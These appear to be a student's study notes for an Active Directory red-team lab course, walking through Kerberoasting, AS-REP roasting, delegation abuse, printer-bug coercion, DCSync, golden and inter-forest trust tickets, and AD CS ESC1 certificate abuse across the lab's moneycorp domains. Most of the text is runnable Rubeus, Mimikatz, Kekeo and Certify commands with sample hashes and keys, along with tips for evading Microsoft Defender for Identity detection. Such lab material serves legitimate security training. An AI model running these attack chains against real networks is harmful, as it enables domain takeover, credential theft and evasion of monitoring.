**Let think of scenario's where there where no service or paths, how can we escalate privileges in an active directory environment, what are other opportunities/ways we can go about it ??**

# **Kerberoast (More Effective)**


![](https://i.imgur.com/ruStWfi.png)



- Offline cracking of service account passwords.
- The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
- Because (non-machine) service account passwords are not frequently changed, this has become a very popular attack!


**_Example -:_**


- Find user accounts used as Service accounts


```powershell
# AD Module

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# PowerView

Get-DomainUser -SPN
```

> **Hint :** When you run `klist`, the SPN can be identified as the name of the {service/machine name}


![](https://i.imgur.com/S7sx0zM.png)


**_Capturing Hashes :_**


- Use Rubeus to list Kerberoast stats


```powershell
Rubeus.exe kerberoast /stats
```


- Use Rubeus to request a TGS (This is a must run)


```powershell
Rubeus.exe kerberoast /user:svcadmin /simple 
```


- To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC (Also must run)

```powershell
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
```

- Kerberoast all possible accounts

```powershell
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```


> **Note -:** You don't need invisi-shell while running `rubeus` here, it won't be stable, also the options with **must run**, must be ran as one might provide an hash and the other might not, depending on system configuration



**_Cracking Hashes :_**


- Crack ticket using John the Ripper


```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-
worst-pass.txt C:\AD\Tools\hashes.txt
```


# **Learning Objective 14**

- Using the Kerberoast attack, crack password of a SQL server service account.


## **Solution**


**_Coming Soon_**



# **Targeted Kerberoasting - AS-REPs**


- If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.
- With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.



![](https://i.imgur.com/MITSHLg.png)


**_Example -:_**


- Enumerating accounts with Kerberos Preauth disabled

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired -Verbose

# AD module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```


- Force disable Kerberos Preauth
- Let's enumerate the permissions for RDPUsers on ACLs using `PowerView`:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose

Get-DomainUser -PreauthNotRequired -Verbose
```



- Request encrypted AS-REP for offline brute-force.
- Let's use `ASREPRoast`


```powershell
Get-ASREPHash -UserName VPN1user -Verbose
```


- To enumerate all users with Kerberos preauth disabled and request a hash


```powershell
Invoke-ASREPRoast -Verbose
```


- We can use John The Ripper to brute-force the hashes offline

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-
pass.txt C:\AD\Tools\asrephashes.txt
```



# **Targeted Kerberoasting - Set SPN**

- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
- We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

**_Example :_**

- Let's enumerate the permissions for **RDPUsers** on ACLs using `PowerView`:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

- See if the user already has a SPN:


```powershell
# Powerview
Get-DomainUser -Identity supportuser | select serviceprincipalname

# AD module
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```


- Set a SPN for the user (must be unique for the forest)

```powershell
# Powerview
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}

# AD module
Set-ADUser -Identity support1user -ServicePrincipalNames
@{Add=‘dcorp/whatever1'}
```



- Kerberoast the user



```powershell
Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```




# **Kerberos Delegation**


- A user provides credentials to the Domain Controller.
- The DC returns a TGT.
- The user requests a TGS for the web service on Web Server.
- The DC provides a TGS.
- The user sends the TGT and TGS to the web server.
- The web server service account use the user's TGT to request a TGS for the database server from the DC.
- The web server service account connects to the database server as the user.


**_Examples -:_**


- Discover domain computers which have unconstrained delegation enabled :


```powershell
# Powerview
Get-DomainComputer -UnConstrained

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True
```



- Compromise the server(s) where Unconstrained delegation is enabled.
- We must trick or wait for a domain admin to connect a service on appsrv.
- Now, if the command is run again:


```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```


- The DA token could be reused:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```


# **Unconstrained Delegation - Printer Bug**


- We can capture the TGT of dcorp-dc$ by using `Rubeus` on **dcorp-appsrv**:


```powershell
Rubeus.exe monitor /interval:5 /nowrap
```


- And after that run `MS-RPRN.exe` - (https://github.com/leechristensen/SpoolSample) - on the student VM:


```powershell
MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

***

- If you are attacking from a Linux machine, check out Coercer - (https://github.com/p0dalirius/Coercer) - for other MS protocols that can be abused for coercion.

***

- Copy the base64 encoded TGT, remove extra spaces (if any) and use it on the student VM:


```powershell
Rubeus.exe ptt /tikcet:
```


- Once the ticket is injected, run `DCSync`:


```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```



# **Learning Objective 15**


- Find a server in dcorp domain where Unconstrained Delegation is enabled.
- Compromise the server and escalate to Domain Admin privileges.
- Escalate to Enterprise Admins privileges by abusing Printer Bug!


## **Solution**



**_Coming Soon_**



# **Constrained Delegation**


- To abuse constrained delegation, we need to have access to the `websvc` account. If we have access to that account, it is possible to access the services listed in **msDS-AllowedToDelegateTo** of the `websvc` account as ANY user. The service account must also have the (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D) `UserAccountControl` attribute


![](https://i.imgur.com/ezTsNOd.png)



**_Example_**



- Enumerate users and computers with constrained delegation enabled


```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```



![](https://i.imgur.com/c767LzL.png)


## **Abusing with Kekeo**


- Either plaintext password or NTLM hash/AES keys is required. We already have access to websvc's hash from dcorp-adminsrv
- Using asktgt from Kekeo, we request a TGT (steps 2 & 3 in the diagram):



```powershell
kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```



- Using s4u from Kekeo, we request a TGS (steps 4 & 5):



```powershell
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
```


- Using mimikatz, inject the ticket (Step 6):


```powershell
Invoke-Mimikatz -Command '"kerberos::ptt
TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.
MONEYCORP.LOCAL_cifs~dcorp-
mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO
CAL.kirbi"'
```


- you can now run command on remote system ( **msDS-AllowedToDelegateTo**)


```
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```




## **Abusing with Rubeus**



- We can use the following command (We are requesting a TGT and TGS in a single command):



```powershell
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```


- you can now run command on remote system ( **msDS-AllowedToDelegateTo**)



```powershell
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```


## **Constrained Delegation - Service Abuse**

- Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. 
- This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service!




- Enumerate users and computers with constrained delegation enabled


```powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```


![](https://i.imgur.com/3ymZaqa.png)



- Abusing with `Rubeus`


- We can use the following command (We are requesting a TGT and TGS in a single command):


```powershell
Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:db7bd8e34fada016eb0e292816040a1bf4eeb25cd3843e041d0278d30dc1b445 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

- After injection, we can run `DCSync`:


```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```



# **Learning Objective 16**



- [ ] Enumerate users in the domain for whom Constrained Delegation is enabled.
	- For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
	- Pass the ticket and access the service as DA.
- [ ] Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
	- For such a user, request a TGT from the DC.
	- Use the TGS for executing the DCSync attack.


## **Solution**


**_Coming Soon_**



# **Resource-based Constrained Delegation**


- To abuse RBCD in the most effective form, we just need two privileges.

	1. Write permissions over the target service or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.
	2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-MachineAccountQuota is 10 for all domain users)
	3. We already have admin privileges on student VMs that are domain joined machines.
	4. Enumeration would show that the user **'ciadmin'** has Write permissions over the dcorp-mgmt machine!

```powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```


- Using the ActiveDirectory module, configure RBCD on `dcorp-mgmt` for student machines :


```powershell
$comps = 'dcorp-student1$','dcorp-student2$' Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```


- Now, let's get the privileges of `dcorp-studentx$` by extracting its AES keys:


```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```



![](https://i.imgur.com/d6NEWHh.png)


> **Note -:** With the above command we wanna extract the AES key for 'dcorp-student1$', which we will use with `rubeus` to access `dcorp-mgmt`, however you might find multiple accounts for this user, so you should take note of this SID - `S-1-5-18` - as this is the SI for system account and that is what we want


- Use the AES key of `dcorp-studentx$` with `Rubeus` and access dcorp-mgmt as ANY user we want:

```powershell
Rubeus.exe s4u /user:dcorp-student1$
/aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d
83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt
/impersonateuser:administrator /ptt
```


- We can then use `winrs` to access remote system, in this case `dcorp-mgmt`


```powershell
winrs -r:dcorp-mgmt cmd
```

^b6965a

# **Learning Objective 17**


- Find a computer object in dcorp domain where we have Write permissions. 
- Abuse the Write permissions to access that computer as Domain Admin.

## **Solution**

**_Coming Soon_**


# **Across Trusts**


- Across Domains - Implicit two way trust relationship.
- Across Forests - Trust relationship needs to be established.



![](https://i.imgur.com/HzxGZe6.png)



# **Child to Parent**


- sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
- sIDHistory can be abused in two ways of escalating privileges within a forest:
	- krbtgt hash of the child
	- Trust tickets



## **Child to Parent using Trust Tickets**



1. So, what is required to forge trust tickets is, obviously, the trust key. Look for [In] trust key from child to parent.



```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
```

OR


```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
```


OR

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```


![](https://i.imgur.com/tglgutQ.png)




2. We can then forge and inter-realm TGT:


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```


|Option|Description|
|---|---|
|Kerberos::golden|The mimikatz module|
|/domain|FQDN of the current domain|
|/sid|SID of the current domain|
|/sids|SID of the enterprise admins group of the parent domain|
|/rc4|RC4 of the trust key|
|/user|User to impersonate|
|/service|Target service in the parent domain|
|/target|FQDN of the parent domain|
|/ticket|Path where the ticket is to be saved (e.g., C:\AD\Tools\trust_tkt.kirbi)|


3. Note that we are still using the TGT forged initially


```powershell
Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```


4. Run command on remote system

```powershell
ls \\mcorp-dc.moneycorp.local\c$
```


> This is how to escalate from child of root


# **Learning Objective 18**


Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to
Enterprise Admin or DA to the parent domain, `moneycorp.loca`l using
the domain trust key.

## **Solution**

**_Coming Soon_**



# **Child to Parent (Alternative) - using krbtgt hash**


- We will abuse sIDhistory once again


```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```



```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```


- In the above command, the mimkatz option **"/sids"** is forcefully setting the `sIDHistory` for the Enterprise Admin group for `dollarcorp.moneycorp.local` that is the Forest Enterprise Admin Group.


- On any machine of the current domain

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
```

- We can now run commands on the remote machine

```powershell
ls \\mcorp-dc.moneycorp.local.kirbi\c$
```

```powershell
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
```


- If you can't access shell on the remote system with `winrs`, in case you get an error as shown in the screen shot below, here is what to do to get a shell 🤟 (DCsync)

![](https://i.imgur.com/3MYuknZ.png)


1. Run the `dcsync` attack against the krbtgt hash of the forest root

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\administrator /domain:moneycorp.local" "exit"
```


2. Now use over-passthehash to start a process as the administrator of `moneycorp.local` of this domain we want the request to be sent to


```powershell
C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /aes256:a85958da138b6b0cea2ec07d3cb57b76fdbd6886938c0250bb5873e2b32371a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show/ptt
```



- You should now have a new process running as domain administrator of `mcorp-dc`, run the `winrs` command again and you should have shell access



```powershell
winrs -r:mcorp-dc cmd
```



![](https://i.imgur.com/mE1snGK.png)



- Avoid suspicious logs by using Domain Controllers group (Bypass MDI Detection)


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```


```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```


**_Domain SID's -:_**

- S-1-5-21-2578538781-2508153159-3419410681-516 - Domain Controllers
- S-1-5-9 - Enterprise Domain Controllers



# **Learning Objective 19**


- Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to Enterprise Admin or DA to the parent domain, `moneycorp.local` using **dollarcorp's** krbtgt hash.


## **Solution**


**_Coming Soon_**


# **Trust Flow Across Forest**


![](https://i.imgur.com/Y447iH2.png)


# **Trust Abuse Across Forest**


![](https://i.imgur.com/91VXRiY.png)



# **Across Forest using Trust Tickets**


- Once again, we require the trust key for the inter-forest trust.


```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

Or

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```






- An inter-forest TGT can be forged


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:2756bdf7dd8ba8e9c40fe60f654115a0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
```


- Abuse with Rubeus
- Using the same TGT which we forged earlier:

```powershell
Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```


- Now we can run commands on remote systems


```powershell
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
```



# **Learning Objective 20**


- With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.


## **Solution**

**_Coming Soon_**




# **Across domain trusts - AD CS**


 Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.




![](https://i.imgur.com/4zrTpzL.png)


{**_Refer To PDF For More Explanation_**}

***

**Practical Example -:**

- We can use the Certify tool (https://github.com/GhostPack/Certify) to enumerate (and for other attacks) AD CS in the target forest:


```powershell
Certify.exe cas
```

- Enumerate the templates.:

```powershell
Certify.exe find
```

- Enumerate vulnerable templates:

```powershell
Certify.exe find /vulnerable
```


- In moneycorp, there are multiple misconfigurations in AD CS.
- Common requirements/misconfigurations for all the Escalations that we have in the lab (ESC1, ESC3 and ESC6)
	- CA grants normal/low-privileged users enrollment rights
	- Manager approval is disabled
	- Authorization signatures are not required
	- The target template grants normal/low-privileged users enrollment rights



**_Exploiting ESC1**


At the below image when we run - `C:\AD\Tools\Certify.exe /enrolleeSuppliesSubject` - We get this information, let break it down 🙂


- The `Template Name` session is the name of the Template
- The `Enrollments Rights` shows the users who can request certificate from the template
- In this case we can't because we are not **Domain Admin** nor **Enterprise Admin**
- The `ENROLLEE_SUPPLIES_SUBJECT` is also enabled
- All conditions met except that we are not  **Domain Admin** nor **Enterprise Admin**



![](https://i.imgur.com/BZTno1k.png)


**WHILE**

- We can see the template name below
- `ENROLLEE_SUPPLIES_SUBJECT` is also enabled
- We have the users that can request certificates in which `RDPUsers`, the group that all of the student users are a member of.
- Cool we can go ahead and use this



![](https://i.imgur.com/IsyR86f.png)



- The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx


```powershell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```


- Copy the output of both the **RSA Private Key** and the **Certificate**
- Open up Notepad and paste into it
- Then save it with the name `esc1.pem` 

![](https://i.imgur.com/niHO6bN.png)


- Run the below command to convert `esc1.pem` to a `.pfx` file so our tool `rubeus` will understand this format


```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```


> If you are asked for a password in the lab, use **secretpassword123**



- Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA).

```powershell
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
```



We should now have access to DC as domain admin


![](https://i.imgur.com/0kZcMqh.png)


**Escalation to Enterprise Admin**

We can also go ahead and collect both the `Private Key` and `Certificates` for `mcorp-dc`


```powershell
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```

- save output as usual into notepad and save with extension `"esc1-EA.pem"`



![](https://i.imgur.com/RQFiyJK.png)
- Convert

```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -ex port -out C:\AD\Tools\esc1-EA.pfx
```

- Request TGT for `mcorp-dc`

```powershell
Rubeus.exe asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
```

- Access `mcorp-dc`

![](https://i.imgur.com/HwJWYTN.png)



# **Learning Objective 21**


- Check if AD CS is used by the target forest and find any vulnerable/abusable templates. 
- Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.


## **Solution**


**_Coming Soon_**



